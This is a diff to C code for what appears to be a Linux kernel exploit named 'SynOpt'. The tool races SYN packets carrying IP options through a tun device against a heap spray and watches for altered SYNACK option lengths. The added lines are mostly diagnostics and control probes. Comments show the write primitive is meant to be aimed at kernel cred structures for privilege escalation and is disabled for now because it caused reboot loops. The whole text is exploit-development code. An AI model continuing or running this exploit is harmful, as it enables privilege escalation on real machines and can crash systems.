@@ -513,11 +1042,18 @@ static int syn_round(uint16_t *sport_out, uint32_t *seq_out, struct synack *out)
         struct synack s;
         int got = pop(&s);
         pthread_mutex_unlock(&g_ring_lock);
-        if (got && s.peer == sport && s.ack == isn + 1) {
-            *sport_out = sport;
-            *seq_out = isn;
-            *out = s;
-            return 1;
+        if (got) {
+            if (s.peer == sport && s.ack == isn + 1) {
+                *sport_out = sport;
+                *seq_out = isn;
+                *out = s;
+                return 1;
+            }
+            g_mismatch++;
+            if (g_mismatch <= 3) {
+                say("[diag] 收到 SYNACK 但对不上：peer=%u(期望 %u) ack=%#x(期望 %#x) optlen=%u",
+                    s.peer, sport, s.ack, isn + 1, s.optlen);
+            }
         }
         struct timespec now;
         clock_gettime(CLOCK_MONOTONIC, &now);
@@ -622,7 +1158,7 @@ static int selfcheck_pkt(void) {
     size_t ihl = (pkt[0] & 0x0f) * 4;
 
     /* IP 头校验和：把整个头再求一次，结果应为 0。 */
-    if (csum_fold(csum_raw(pkt, 20 + OPT_MAXLEN)) != 0) {
+    if (csum_fold(csum_raw(pkt, ihl)) != 0) {
         say("[selfcheck] IP 头校验和错误");
         return 1;
     }
@@ -651,8 +1187,8 @@ static int phase_probe(void) {
             say("probe %d: 没收到 SYNACK（累计 g_rx=%lu）", i, g_rx);
             continue;
         }
-        if (s.optlen != OPT_MAXLEN) {
-            say("probe %d: 选项长度 %u（预期 %u）", i, s.optlen, OPT_MAXLEN);
+        if (s.optlen != (uint8_t)g_optlen) {
+            say("probe %d: 选项长度 %u（预期 %d）", i, s.optlen, g_optlen);
             continue;
         }
         say("probe %d: 选项 %u 字节原样返回，标记 %02x%02x", i, s.optlen, s.opts[3], s.opts[4]);
@@ -737,6 +1273,17 @@ static int phase_race(struct hit_ctx *hit) {
                 say("[!] 检查：端口 %u 是否在 %u.%u.%u.%u 上 listen、tun 是否收到包",
                     g_port, g_dst & 0xff, (g_dst >> 8) & 0xff,
                     (g_dst >> 16) & 0xff, (g_dst >> 24) & 0xff);
+                dump_trace();
+                say("[!] 回到 tun 的 TCP 包共 %lu 个，其中 RST %lu 个；回给我们端口的 %lu 个（RST %lu）",
+                    g_tcp_other, g_rst_seen, g_tcp_other_to_us, g_rst_to_us);
+                if (g_rst_to_us > 0) {
+                    say("[!] 诊断：内核回了 RST —— 包进了 TCP 层，但没有 socket 接住这个 SYN");
+                    say("[!]       也就是说 listener 没匹配上（地址/端口/命名空间），不是选项问题");
+                } else if (g_tcp_other_to_us > 0) {
+                    say("[!] 诊断：有 TCP 回包但都不是 SYN+ACK，看上面的 flags");
+                } else {
+                    say("[!] 诊断：TCP 层没有回任何东西 —— SYN 很可能在 IP 层就被丢了");
+                }
                 spray_stop();
                 return 1;
             }
@@ -746,7 +1293,7 @@ static int phase_race(struct hit_ctx *hit) {
         g_synack++;
         if (s.optlen == 0) {
             g_clear++;
-        } else if (s.optlen != OPT_MAXLEN) {
+        } else if (s.optlen != (uint8_t)g_optlen) {
             g_hit++;
             say("命中 r=%d optlen=%u gen=%u", r, s.optlen, g_spray_gen);
             dump_opts(&s);
@@ -770,7 +1317,7 @@ static int phase_race(struct hit_ctx *hit) {
         for (int i = 0; i < late_n; i++) {
             struct synack *ls = &late[i];
             if (ls->optlen == 0) { g_clear++; continue; }
-            if (ls->optlen == OPT_MAXLEN) continue;
+            if (ls->optlen == (uint8_t)g_optlen) continue;
             g_hit++;
             say("命中（重传路径）r=%d optlen=%u gen=%u", r, ls->optlen, g_spray_gen);
             dump_opts(ls);
@@ -978,6 +1525,7 @@ int main(int argc, char **argv) {
         else if (!strcmp(argv[i], "--port") && i + 1 < argc) g_port = (uint16_t)atoi(argv[++i]);
         else if (!strcmp(argv[i], "--rounds") && i + 1 < argc) g_rounds = atoi(argv[++i]);
         else if (!strcmp(argv[i], "--phase") && i + 1 < argc) phase = argv[++i];
+        else if (!strcmp(argv[i], "--ip-options") && i + 1 < argc) g_optlen = atoi(argv[++i]);
         else if (!strcmp(argv[i], "--verbose")) g_verbose = 1;
         /* 写路径暂时硬关闭：用户实测出现重启循环，在写原语定向到 cred
          * 之前不能真的动内核。参数保留但不再生效，避免旧脚本误开。 */
@@ -1007,6 +1555,68 @@ int main(int argc, char **argv) {
         if (g_rounds > 50) g_rounds = 50;
     }
 
+    /* 第零刀（最便宜）：用本机 socket 验"带选项的 SYN 到底能不能进内核"。
+     * 这一步和 tun 完全无关，先做，省得把通道问题和选项问题混在一起。 */
+    if (g_optlen != 0) {
+        int local = probe_local_connect();
+        if (local == 2) {
+            say("[!] 结论：内核不接受带 IP 选项的 SYN，SynOpt 的漏洞入口在本机不成立");
+            say("[!] 已中止，未做任何写操作");
+            g_running = 0;
+            if (g_listen_fd >= 0) { close(g_listen_fd); g_listen_fd = -1; }
+            pthread_join(th, NULL);
+            return 6;
+        }
+        if (local == 1) {
+            say("[!] 本机 TCP 自连都不通，无法判断选项问题；继续跑 tun 侧观察");
+        }
+    }
+
+    /* 补充探针：带选项的 ICMP 能不能回。
+     *
+     * ICMP 走的是另一条收包分支，它拒绝不代表 TCP 也拒绝，所以只报警
+     * 不中止 —— 真正的判据是后面的 control_no_options（直接打 TCP）。 */
+    if (g_optlen != 0) {
+        if (probe_ipopt_icmp() != 0) {
+            say("[!] 注意：带选项的 ICMP 没回来，但仍继续测 TCP（判据以 control 为准）");
+        }
+    }
+
+    /* 第一刀：TCP 这条路通不通。闭端口应该回 RST。 */
+    int closed_ok = (probe_closed_port() == 0);
+    if (!closed_ok) {
+        say("[!] 连 RST 都收不到：包没进 TCP 层，或者回包没回到 tun");
+        say("[!] 这一步不通，后面所有 SYNACK 相关的判断都没有意义");
+        dump_trace();
+        g_running = 0;
+        if (g_listen_fd >= 0) { close(g_listen_fd); g_listen_fd = -1; }
+        pthread_join(th, NULL);
+        return 4;
+    }
+
+    /* 关键对照：不带 IP 选项的 SYN 能不能拿到 SYNACK。
+     *
+     * 这一步把「TCP 通道不通」和「IP 选项被内核拒绝」彻底分开。之前
+     * synack 一直是 0，两个原因都说得通，白跑了好几轮。 */
+    if (g_optlen != 0) {
+        int ctl = control_no_options();
+        if (ctl != 0) {
+            dump_trace();
+            if (ctl == 1) {
+                say("[!] 结论：不带 IP 选项的 TCP 也拿不到 SYNACK —— 问题在通道或监听");
+                say("[!] 先查：10.7.7.0/24 是否真的路由进 tun、SYN 是否进了 tcp_v4_rcv");
+            } else {
+                say("[!] 结论：通道正常，但内核不接受带 IP 选项的入站 SYN");
+            }
+            say("[!] 本阶段中止（不带选项硬跑下去只会浪费时间）");
+            g_running = 0;
+            if (g_listen_fd >= 0) { close(g_listen_fd); g_listen_fd = -1; }
+            pthread_join(th, NULL);
+            return 3;
+        }
+        say("[OK] 对照通过：带选项的 SYN 能拿到 SYNACK");
+    }
+
     int rc;
     if (!strcmp(phase, "probe")) {
         rc = phase_probe();
@@ -1021,8 +1631,21 @@ int main(int argc, char **argv) {
         }
     }
 
+    dump_trace();
+    if (g_raw_first_len) {
+        char line[256];
+        int off = snprintf(line, sizeof(line), "首包 proto=%u len=%zu:", g_raw_proto, g_raw_first_len);
+        for (size_t i = 0; i < g_raw_first_len && i < 48; i++)
+            off += snprintf(line + off, sizeof(line) - off, " %02x", g_raw_first[i]);
+        say("%s", line);
+    }
     say("统计: tx=%lu rx=%lu synack=%lu hit=%lu clear=%lu none=%lu raw=%lu icmp=%lu",
         g_tx, g_rx, g_synack, g_hit, g_clear, g_none, g_raw_rx, g_icmp_rx);
+    say("      回到 tun 的 TCP=%lu RST=%lu 对不上的 SYNACK=%lu",
+        g_tcp_other, g_rst_seen, g_mismatch);
+    say("      回给我们端口的 TCP=%lu（其中 RST %lu）", g_tcp_other_to_us, g_rst_to_us);
+    say("      ICMP: echo-reply=%lu param-problem=%lu unreach=%lu",
+        g_icmp_echo_reply, g_icmp_param_prob, g_icmp_unreach);
     g_running = 0;
     if (g_listen_fd >= 0) { close(g_listen_fd); g_listen_fd = -1; }
     pthread_join(th, NULL);
